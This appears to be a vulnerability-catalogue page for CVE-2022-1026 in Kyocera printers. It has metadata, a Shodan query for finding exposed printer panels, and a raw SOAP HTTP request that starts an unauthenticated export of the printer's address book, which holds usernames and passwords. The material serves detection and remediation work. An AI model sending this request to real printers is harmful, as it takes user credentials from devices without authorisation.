_cves/2022/cve-2022-1026.md

---
layout: post
cve_id: CVE-2022-1026
title: Kyocera Net View Address Book Exposure
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1026.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1026.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: high
impact: 'Unauthenticated attackers can export the address book from Kyocera printers
  containing sensitive user information including usernames and passwords without
  authentication.

  '
remediation: 'Apply firmware updates provided by Kyocera or configure authentication
  for the address book export function.

  '
reference:
- https://github.com/ac3lives/kyocera-cve-2022-1026
- https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
  cvss-score: 8.6
  cve-id: CVE-2022-1026
  cwe-id: CWE-522
  epss-score: 0.86782
  epss-percentile: 0.99397
  cpe: cpe:2.3:a:kyocera:net_viewer:*:*:*:*:*:*:*:*
metadata:
  vendor: kyocera
  product: net_viewer
  shodan-query: product:"Kyocera Printer Panel"
  max-request: 1
tags:
- cve
- cve2022
- kyocera
- exposure
- vkev
- vuln
---

## 🔍 Vulnerability Description
Kyocera multifunction printers running vulnerable versions of Net View unintentionally expose sensitive user information, including usernames and passwords, through an insufficiently protected address book export function.


## 🌐 HTTP Request
```nohighlight
POST /ws/km-wsdl/setting/address_book HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Content-Length: 812
Content-Type: application/soap+xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

